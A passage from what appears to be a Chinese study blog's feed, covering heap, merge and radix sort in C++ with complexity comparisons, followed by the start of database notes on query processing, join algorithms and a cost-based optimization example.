class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-2-堆排序"><a href="#2-3-2-堆排序" class="headerlink" title="2.3.2 堆排序"></a>2.3.2 堆排序</h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p><p>堆排序可以说是一种利用堆的概念来排序的选择排序。分为两种方法：</p><ol><li>大顶堆：每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列；</li><li>小顶堆：每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列；</li></ol><p><strong>算法思想</strong></p><ol><li>创建一个堆 H[0……n-1]；</li><li>把堆首（最大值）和堆尾互换；</li><li>把堆的尺寸减 1，并调用 down(1)，目的是把新的数组顶端数据调整到相应位置；</li><li>重复步骤 2，直到堆的尺寸为 1。</li></ol><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(nlogn)</li><li>空间复杂度：O(1)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 小根堆排序</span></span><br><span class="line"><span class="type">int</span> heap[N], len;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> t = u;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">2</span> * u &lt;= len &amp;&amp; heap[<span class="number">2</span> * u] &lt; heap[t]) t = <span class="number">2</span> * u;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">2</span> * u + <span class="number">1</span> &lt;= len &amp;&amp; heap[<span class="number">2</span> * u + <span class="number">1</span>] &lt; heap[t]) t = <span class="number">2</span> * u + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (t != u)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">swap</span>(heap[t], heap[u]);</span><br><span class="line"><span class="built_in">down</span>(t);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heap_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = len / <span class="number">2</span>; i; i --) <span class="built_in">down</span>(i);</span><br><span class="line"><span class="type">int</span> n = len;</span><br><span class="line"><span class="keyword">while</span> (n --)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; heap[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">heap[<span class="number">1</span>] = heap[len --];</span><br><span class="line"><span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动图演示</strong></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1654613/oa8b9kqix4.gif" alt="alt text"></p><h2 id="2-4-归并排序和基数排序"><a href="#2-4-归并排序和基数排序" class="headerlink" title="2.4 归并排序和基数排序"></a>2.4 归并排序和基数排序</h2><h3 id="2-4-1-归并排序"><a href="#2-4-1-归并排序" class="headerlink" title="2.4.1 归并排序"></a>2.4.1 归并排序</h3><p>归并排序（Merge sort）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p><p>作为一种典型的分而治之思想的算法应用，归并排序的实现有两种方法：</p><ol><li>自上而下的递归（所有递归的方法都可以用迭代重写，所以就有了第 2 种方法）；</li><li>自下而上的迭代；</li></ol><p>和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是 O(nlogn) 的时间复杂度。代价是需要额外的内存空间。</p><p><strong>算法思想</strong></p><ol><li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li><li>设定两个指针，最初位置分别为两个已经排序序列的起始位置</li><li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置</li><li>重复步骤3直到某一指针达到序列尾；</li><li>将另一序列剩下的所有元素直接复制到合并序列尾。</li></ol><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(nlogn)</li><li>空间复杂度：O(n)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 归并排序</span></span><br><span class="line"><span class="type">int</span> a[N], tmp[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="built_in">merge_sort</span>(l, mid);</span><br><span class="line"><span class="built_in">merge_sort</span>(mid + <span class="number">1</span>, r);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> k = <span class="number">0</span>, i = l, j = mid + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line"><span class="keyword">if</span> (a[i] &lt;= a[j]) tmp[++ k] = a[i ++];</span><br><span class="line"><span class="keyword">else</span> tmp[++ k] = a[j ++];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid) tmp[++ k] = a[i ++];</span><br><span class="line"><span class="keyword">while</span> (j &lt;= r) tmp[++ k] = a[j ++];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = l, j = <span class="number">1</span>; j &lt;= k; i ++, j ++)</span><br><span class="line">a[i] = tmp[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动图演示</strong></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1654613/xyrh3ni4ji.gif" alt="alt text"></p><h3 id="2-4-2-基数排序"><a href="#2-4-2-基数排序" class="headerlink" title="2.4.2 基数排序"></a>2.4.2 基数排序</h3><p>基数排序是一种很特别的排序方法，它不基于比较和移动进行排序，而基于关键字各位的大小进行排序。借助多关键字排序的思想对单逻辑关键字进行排序。</p><p><strong>最高位优先法（MSD）</strong></p><ol><li>先对最高位关键字k1（如花色）排序，将序列分成若干子序列，每个子序列有相同的k1值；</li><li>然后让每个子序列对次关键字k2（如面值）排序，又分成若干更小的子序列；</li><li>依次重复，直至就每个子序列对最低位关键字kd排序；</li><li>最后将所有子序列依次连接在一起成为一个有序序列</li></ol><p><strong>最低位优先法（LSD）</strong></p><ol><li>从最低位关键字kd起进行排序，然后再对高一位的关键字排序</li><li>依次重复，直至对最高位关键字k1排序后，便成为一个有序序列</li></ol><p><strong>链式基数排序</strong></p><p>假如多关键字的记录序列中，每个关键字的取值范围相同，则按LSD法进行排序时，可以采用“分配-收集”的方法，其好处是不需要进行关键字间的比较。</p><p>对于数字型或字符型的单关键字，可以看成是由多个数位或多个字符构成的多关键字，此时可以采用这种“分配-收集”的办法进行排序，称作基数排序法。</p><ul><li>首先按其 “个位数”  取值分别为 0, 1, …,  9“分配” 成 10 组，之后按从 0 至 9 的顺序将  它们 “收集” 在一起；</li><li>然后按其 “十位数”  取值分别为 0, 1, …, 9 “分配” 成 10 组，之后再按从 0 至 9 的顺序将它们 “收集” 在一起；</li><li>最后按其“百位数”重复一遍上述操作。</li></ul><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：需要进行 d 次分配和收集，一趟分配需要O(n)，一趟收集需要O(r)，所以时间复杂度为O(d(n + r))，与序列的初始状态无关</li><li>空间复杂度：一趟排序需要的辅助存储空间为 r （r个队列），以后的排序会重复使用这些队列，所以为O(r)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基数排序</span></span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; q[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">radix_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 找出最大值 确定要进行多少轮排序</span></span><br><span class="line"><span class="type">int</span> mx = a[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="keyword">if</span> (a[i] &gt; mx) mx = a[i];</span><br><span class="line"><span class="comment">// 计算最大数字是几位数</span></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">to_string</span>(mx).<span class="built_in">length</span>();</span><br><span class="line"><span class="comment">// len轮分配和收集</span></span><br><span class="line"><span class="type">int</span> k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (len --)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> digit = a[i] / k % <span class="number">10</span>;</span><br><span class="line">q[digit].<span class="built_in">push_back</span>(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 把队列中存放的数字取出来</span></span><br><span class="line"><span class="type">int</span> cnt = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> t : q[i])</span><br><span class="line">a[cnt ++] = t;</span><br><span class="line">q[i].<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line">k *= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动图演示</strong></p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/radixSort.gif" alt="alt text"></p><h1 id="3-内部排序算法的比较及应用"><a href="#3-内部排序算法的比较及应用" class="headerlink" title="3.内部排序算法的比较及应用"></a>3.内部排序算法的比较及应用</h1><h2 id="3-1-内部排序算法的比较"><a href="#3-1-内部排序算法的比较" class="headerlink" title="3.1 内部排序算法的比较"></a>3.1 内部排序算法的比较</h2><h3 id="3-1-1-从时间复杂度比较"><a href="#3-1-1-从时间复杂度比较" class="headerlink" title="3.1.1 从时间复杂度比较"></a>3.1.1 从时间复杂度比较</h3><ul><li>直接插入排序、冒泡排序、简单选择排序是三种简单的排序方法，时间复杂度都为O(n²)，且实现方法较简单，但直接插入排序和冒泡排序最好情况下的时间复杂度可以到达O(n)，而简单选择排序与序列的初始状态无关。</li><li>希尔排序作为插入排序的拓展，对较大规模的排序都可以达到很高的效率，但目前未得出其精确的渐近时间。</li><li>堆排序利用了一种称为堆的数据结构，可以在线性时间内完成建堆，且在 O(nlog₂n)内完成排序过程。</li><li>快速排序基于分治的思想，虽然最坏情况下的时间复杂度会达到 O(n²)，但快速排序的平均性能可以达到 O(nlog₂n)，在实际应用中常常优于其他排序算法。</li><li>归并排序同样基于分治的思想，但由于其分割子序列与初始序列的排列无关，因此它的最好、最坏和平均时间复杂度均为 O(nlog₂n)。</li></ul><h3 id="3-1-2-从空间复杂度比较"><a href="#3-1-2-从空间复杂度比较" class="headerlink" title="3.1.2 从空间复杂度比较"></a>3.1.2 从空间复杂度比较</h3><ul><li>简单选择排序、插入排序、冒泡排序、希尔排序和堆排序都仅需借助常数个辅助空间。</li><li>快速排序需要借助一个递归工作栈，平均大小为 O(log₂n)，当然在最坏情况下可能会增长到 O(n)。</li><li>二路归并排序在合并操作中需要借助较多的辅助空间用于元素复制,大小为 O(n),虽然有方法能克服这个缺点，但其代价是算法会很复杂而且时间复杂度会增加。</li></ul><h3 id="3-1-3-从稳定性比较"><a href="#3-1-3-从稳定性比较" class="headerlink" title="3.1.3 从稳定性比较"></a>3.1.3 从稳定性比较</h3><ul><li>插入排序、冒泡排序、归并排序和基数排序是稳定的排序算法，而简单选择排序、快速排序、希尔排序和堆排序都是不稳定的排序算法。</li><li>平均时间复杂度为 O(nlog₂n)的稳定排序算法只有归并排序，对于不稳定的排序算法，只需举出一个不稳定的实例即可。</li><li>对于排序算法的稳定性，读者应能从算法本身的原理上去理解，而不应拘泥于死记硬背。</li></ul><h3 id="3-1-4-从适用性比较"><a href="#3-1-4-从适用性比较" class="headerlink" title="3.1.4 从适用性比较"></a>3.1.4 从适用性比较</h3><ul><li>折半插入排序、希尔排序、快速排序和堆排序适用于顺序存储。</li><li>直接插入排序、冒泡排序、简单选择排序、归并排序和基数排序既适用于顺序存储，又适用于链式存储。</li></ul><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E6%8E%92%E5%BA%8F/image.png"></p><h2 id="3-2-内部排序算法的应用"><a href="#3-2-内部排序算法的应用" class="headerlink" title="3.2 内部排序算法的应用"></a>3.2 内部排序算法的应用</h2><h3 id="3-2-1-选取排序算法时需要考虑的因素"><a href="#3-2-1-选取排序算法时需要考虑的因素" class="headerlink" title="3.2.1 选取排序算法时需要考虑的因素"></a>3.2.1 选取排序算法时需要考虑的因素</h3><ol><li>待排序的元素个数 n。</li><li>待排序的元素的初始状态。</li><li>关键字的结构及其分布情况。</li><li>稳定性的要求。</li><li>存储结构及辅助空间的大小限制等。</li></ol><h3 id="3-2-2-排序算法小结"><a href="#3-2-2-排序算法小结" class="headerlink" title="3.2.2 排序算法小结"></a>3.2.2 排序算法小结</h3><ol><li>若 n 较小，可采用直接插入排序或简单选择排序。由于直接插入排序所需的记录移动次数较简单选择排序的多，因此当记录本身信息量较大时，用简单选择排序较好。</li><li>若文件的初始状态已按关键字基本有序，则选用直接插入或冒泡排序为宜。</li><li>若n较大，应采用时间复杂度为 O(nlog₂n)的排序算法：快速排序、堆排序或归并排序。<ul><li>当待排序的关键字随机分布时，快速排序被认为是目前基于比较的内部排序算法中最好的算法。</li><li>堆排序所需的辅助空间少于快速排序，且不会出现快速排序可能的最坏情况，这两种排序都是不稳定的。</li><li>若要求稳定且时间复杂度为 O(nlog₂n)，可选用归并排序。</li></ul></li><li>在基于比较的排序算法中，每次比较两个关键字的大小之后，仅出现两种可能的转移，因此可以用一棵二叉树来描述比较判定过程。由此可以证明：当文件的n个关键字随机分布时，任何借助于“比较”的排序算法，至少需要 O(nlog₂n)的时间。</li><li>若n很大，记录的关键字位数较少且可以分解时，采用基数排序较好。</li><li>当记录本身信息量较大时，为避免耗费大量时间移动记录，可用链表作为存储结构。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库第9章：关系查询处理和查询优化</title>
      <link href="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/"/>
      <url>/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_BsqaVhr9yK.png"></p><p>本章介绍数据库的查询处理和查询优化，查询优化一般可分为代数优化（逻辑优化）和物理优化。</p><h1 id="1-关系数据库系统的查询处理-x20"><a href="#1-关系数据库系统的查询处理-x20" class="headerlink" title="1 关系数据库系统的查询处理&#x20;"></a>1 关系数据库系统的查询处理&#x20;</h1><h2 id="1-1-查询处理步骤"><a href="#1-1-查询处理步骤" class="headerlink" title="1.1 查询处理步骤"></a>1.1 查询处理步骤</h2><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_MftgrgJFR3.png"></p><p>RDBMS查询处理阶段 ：</p><ol><li>查询分析</li><li>查询检查</li><li>查询优化</li><li>查询执行</li></ol><h3 id="1-1-1-查询分析"><a href="#1-1-1-查询分析" class="headerlink" title="1.1.1 查询分析"></a>1.1.1 查询分析</h3><p>对查询语句进行扫描、词法分析和语法分析，从查询语句中识别出语言符号，如SQL关键字、属性名和关系名等。</p><p>进行语法检查和语法分析，如果没有语法错误就转入下步处理，否则报告语句中出现的错误。</p><h3 id="1-1-2-查询检查"><a href="#1-1-2-查询检查" class="headerlink" title="1.1.2 查询检查"></a>1.1.2 查询检查</h3><p>根据数据字典对合法的查询语句进行语义检查，根据数据字典中的用户权限和完整性约束定义对用户的存取权限进行检查。</p><p>还要根据数据字典中的用户权限和完整性约束定义对用户的存取权限进行检查，这时的完整性检查是初步的、静态的检查。</p><p>检查通过后把SQL查询语句转换成等价的<strong>关系代数表达式</strong>。RDBMS一般都用<strong>查询树</strong>（语法分析树）来表示扩展的关系代数表达式，把数据库对象的外部名称转换为内部表示。</p><h3 id="1-1-3-查询优化"><a href="#1-1-3-查询优化" class="headerlink" title="1.1.3 查询优化"></a>1.1.3 查询优化</h3><p>选择一个高效执行的查询处理策略，查询优化分类 ：</p><ul><li><strong>代数优化</strong>：指关系代数表达式的优化</li><li><strong>物理优化</strong>：指存取路径和底层操作算法的选择</li></ul><p>查询优化方法选择的依据：</p><ul><li>基于规则(rule based)</li><li>基于代价(cost based)</li><li>基于语义(semantic based)</li></ul><h3 id="1-1-4-查询执行-xD"><a href="#1-1-4-查询执行-xD" class="headerlink" title="1.1.4 查询执行&#xD;"></a>1.1.4 查询执行&#xD;</h3><p>依据优化器得到的执行策略生成查询计划，代码生成器(code generator)生成执行查询计划的代码。</p><h2 id="1-2-实现查询操作的算法示例"><a href="#1-2-实现查询操作的算法示例" class="headerlink" title="1.2 实现查询操作的算法示例"></a>1.2 实现查询操作的算法示例</h2><h3 id="1-2-1-选择操作的实现"><a href="#1-2-1-选择操作的实现" class="headerlink" title="1.2.1 选择操作的实现"></a>1.2.1 选择操作的实现</h3><p>选择操作典型实现方法：</p><ol><li>简单的全表扫描方法&#x20;<ul><li>对查询的基本表顺序扫描，逐一检查每个元组是否满足选择条件，把满足条件的元组作为结果输出&#x20;</li><li>适合小表，不适合大表</li></ul></li><li>索引（或散列）扫描方法<ul><li>适合选择条件中的属性上有索引（例如B+树索引或Hash索引）</li><li>通过索引先找到满足条件的元组主码或元组指针，再通过元组指针直接在查询的基本表中找到元组&#x20;</li></ul></li></ol><p>当选择率较低时，基于索引的选择算法要优于全表扫描算法，当选择率较高时，或者要查找的元组均匀分布在查找的表中，此时基于索引的选择算法的性能不如全表扫描算法。</p><h3 id="1-2-2-连接操作的实现-xD"><a href="#1-2-2-连接操作的实现-xD" class="headerlink" title="1.2.2 连接操作的实现 &#xD;"></a>1.2.2 连接操作的实现 &#xD;</h3><p>连接操作是查询处理中最耗时的操作之一，本节只讨论等值连接(或自然连接)最常用的实现算法。</p><h4 id="1-2-2-1-嵌套循环方法-nested-loop-x20"><a href="#1-2-2-1-嵌套循环方法-nested-loop-x20" class="headerlink" title="1.2.2.1 嵌套循环方法(nested loop)&#x20;"></a>1.2.2.1 嵌套循环方法(nested loop)&#x20;</h4><ul><li>对外层循环(Student)的每一个元组(s)，检索内层循环(SC)中的每一个元组(sc)</li><li>检查这两个元组在连接属性(sno)上是否相等</li><li>如果满足连接条件，则串接后作为结果输出，直到外层循环表中的元组处理完为止&#x20;</li></ul><h4 id="1-2-2-2-排序-合并方法-sort-merge-join-或merge-join"><a href="#1-2-2-2-排序-合并方法-sort-merge-join-或merge-join" class="headerlink" title="1.2.2.2 排序-合并方法(sort-merge join 或merge join)"></a>1.2.2.2 排序-合并方法(sort-merge join 或merge join)</h4><ul><li>适合连接的诸表已经排好序的情况&#x20;</li></ul><p>排序－合并连接方法的步骤：</p><ol><li>如果连接的表没有排好序，先对Student表和SC表按连接属性Sno排序&#x20;</li><li>取Student表中第一个Sno，依次扫描SC表中具有相同Sno的元组&#x20;</li><li>当扫描到Sno不相同的第一个SC元组时，返回Student表扫描它的下一个元组，再扫描SC表中具有相同Sno的元组，把它们连接起来&#x20;</li><li>重复上述步骤直到Student 表扫描完</li></ol><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_gK7OWwXBoJ.png"></p><p>这样Student表和SC表都只要扫描一遍即可。当然，如果两个表原来无序，执行时间要加上对两个表的排序时间。</p><p>一般来说，对于2个大表，先排序后使用sort-merge join方法执行连接，总的时间一般仍会大大减少。&#x20;</p><h4 id="1-2-2-3-索引连接-index-join-方法"><a href="#1-2-2-3-索引连接-index-join-方法" class="headerlink" title="1.2.2.3 索引连接(index join)方法"></a>1.2.2.3 索引连接(index join)方法</h4><ol><li>在SC表上建立属性Sno的索引，如果原来没有该索引</li><li>对Student中每一个元组，由Sno值通过SC的索引查找相应的SC元组&#x20;</li><li>把这些SC元组和Student元组连接起来&#x20;</li></ol><p>循环执行②③，直到Student表中的元组处理完为止。</p><h4 id="1-2-2-4-Hash-Join方法"><a href="#1-2-2-4-Hash-Join方法" class="headerlink" title="1.2.2.4 Hash Join方法"></a>1.2.2.4 Hash Join方法</h4><p>把连接属性作为hash码，用同一个hash函数把R和S中的元组散列到同一个hash文件中</p><p>步骤：</p><ol><li>划分阶段(partitioning phase)：<ul><li>对包含较少元组的表(比如R)进行一遍处理</li><li>把它的元组按hash函数分散到hash表的桶中</li></ul></li><li>试探阶段(probing phase)，也称为连接阶段(join phase)：<ul><li>对另一个表(S)进行一遍处理</li><li>把S的元组散列到适当的hash桶中</li><li>把元组与桶中所有来自R并与之相匹配的元组连接起来&#x20;</li></ul></li></ol><p>上面hash join算法前提：假设两个表中较小的表在第一阶段后可以完全放入内存的hash桶中，以上的算法思想可以推广到更加一般的多个表的连接算法上。</p><hr><h1 id="2-关系数据库系统的查询优化"><a href="#2-关系数据库系统的查询优化" class="headerlink" title="2 关系数据库系统的查询优化"></a>2 关系数据库系统的查询优化</h1><p>查询优化在关系数据库系统中有着非常重要的地位，关系查询优化是影响RDBMS性能的关键因素，由于关系表达式的语义级别很高，使关系系统可以从关系表达式中分析查询语义，提供了执行查询优化的可能性。</p><h2 id="2-1-查询优化概述"><a href="#2-1-查询优化概述" class="headerlink" title="2.1 查询优化概述"></a>2.1 查询优化概述</h2><p>查询优化的优点不仅在于用户不必考虑如何最好地表达查询以获得较高的效率，而且在于系统可以比用户程序的“优化”做得更好。这是因为：</p><ol><li>优化器可以从数据字典中获取许多<strong>统计信息</strong>，而用户程序则难以获得这些信息</li><li>如果数据库的<strong>物理统计信息</strong>改变了，系统可以自动对查询重新优化以选择相适应的执行计划。在非关系系统中必须重写程序，而重写程序在实际应用中往往是不太可能的。</li><li>优化器可以考虑<strong>数百种不同的执行计划</strong>，程序员一般只能考虑有限的几种可能性</li><li>优化器中包括了很多<strong>复杂的优化技术</strong>，这些优化技术往往只有最好的程序员才能掌握。系统的自动优化相当于使得所有人都拥有这些优化技术</li></ol><p>RDBMS通过某种代价模型计算出各种查询执行策略的执行代价，然后选取代价最小的执行方案</p><p>在集中式数据库中，查询开销主要包括：</p><ol><li>磁盘存取块数(I&#x2F;O代价)，<strong>I&#x2F;O代价是最主要的</strong></li><li>处理机时间(CPU代价)</li><li>查询的内存开销</li></ol><p>分布式数据库中：</p><ul><li>总代价 &#x3D; I&#x2F;O代价+CPU代价+内存代价＋<strong>通信代价</strong></li></ul><p>查询优化的总目标：</p><ul><li>选择有效的策略</li><li>求得给定关系表达式的值</li><li>使得查询代价最小(实际上是较小)&#x20;</li></ul><h2 id="2-2-一个实例"><a href="#2-2-一个实例" class="headerlink" title="2.2 一个实例"></a>2.2 一个实例</h2><blockquote><p>求选修了2号课程的学生姓名。用SQL表达：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Student.Sname <span class="keyword">FROM</span>  Student，SC </span><br><span class="line">    <span class="keyword">WHERE</span> Student.Sno<span class="operator">=</span>SC.Sno <span class="keyword">AND</span> SC.Cno<span class="operator">=</span>‘<span class="number">2</span>’;</span><br></pre></td></tr></table></figure><p>假定学生-课程数据库中有1000个学生记录，10000个选课记录，其中选修2号课程的选课记录为50个。系统可以用多种等价的关系代数表达式来完成这一查询：</p><p>$$<br>\begin{array}{l}Q_{1}&#x3D;\pi_{\text {Sname }}\left(\sigma_{\text {Student.Sno }}&#x3D;\mathrm{Sc} . \text { Sno } \wedge \text { Sc.Cno&#x3D;’2’ }(\text { Student } \times \mathrm{SC})\right) \ Q_{2}&#x3D;\pi_{\text {Sname }}\left(\sigma_{\text {Sc.Cno }&#x3D;2 ‘}(\text { Student } \bowtie S C)\right) \ Q_{3}&#x3D;\pi_{\text {Sname }}\left(\text { Student } \bowtie \sigma_{\text {Sc.Cno&#x3D;’2}}(S C)\right) \\end{array}<br>$$</p><ul><li>Q1是先求两个表的笛卡尔积，然后再进行条件筛选</li><li>Q2先对两个表进行等值连接，再选择</li><li>Q3先对表进行筛选，再进行连接</li></ul><h3 id="2-2-1-第一种情况"><a href="#2-2-1-第一种情况" class="headerlink" title="2.2.1 第一种情况"></a>2.2.1 第一种情况</h3><p>$$<br>Q_{1}&#x3D;\Pi_{\text {Sname }}\left(\sigma_{\text {Student.Sno }&#x3D;\text { SC.Sno }} \wedge\right. Sc.Cno&#x3D;’2’ Student \times SC \left.)\right)<br>$$</p><h4 id="2-2-1-1-计算笛卡尔积"><a href="#2-2-1-1-计算笛卡尔积" class="headerlink" title="2.2.1.1 计算笛卡尔积"></a>2.2.1.1 计算笛卡尔积</h4><p>计算广义笛卡尔积，把Student和SC的每个元组连接起来的做法：</p><ol><li>在内存中尽可能多地装入某个表(如Student表)的若干块，留出一块存放另一个表(如SC表)的元组</li><li>把SC中的每个元组和Student中每个元组连接，连接后的元组装满一块后就写到中间文件上</li><li>从SC中读入一块和内存中的Student元组连接，直到SC表处理完</li><li>再读入若干块Student元组，读入一块SC元组</li><li>重复上述处理过程，直到把Student表处理完</li></ol><p>设一个块能装10个Student元组或100个SC元组，在内存中存放5块Student元组和1块SC元组，则读取总块数为：</p><p>$$<br>\frac{1000}{10} + \frac{1000}{10 \times 5} \times \frac{10000}{100} &#x3D;100+20 \times 100&#x3D;2100 块<br>$$</p><p>其中，读Student表100块。读SC表20遍，每遍100块。若每秒读写20块，则总计要花105 s。</p><p>连接后的元组数为 $10^{3} \times 10^{4} &#x3D; 10^{7}$。设每块能装10个元组，则写出这些块要用$10^{6} &#x2F; 20&#x3D;5 \times 10^{4} s$。</p><h4 id="2-2-1-2-做选择操作"><a href="#2-2-1-2-做选择操作" class="headerlink" title="2.2.1.2 做选择操作"></a>2.2.1.2 做选择操作</h4><p>依次读入连接后的元组，按照选择条件选取满足要求的记录，假定内存处理时间忽略。读取中间文件花费的时间(同写中间文件一样)需$5 \times 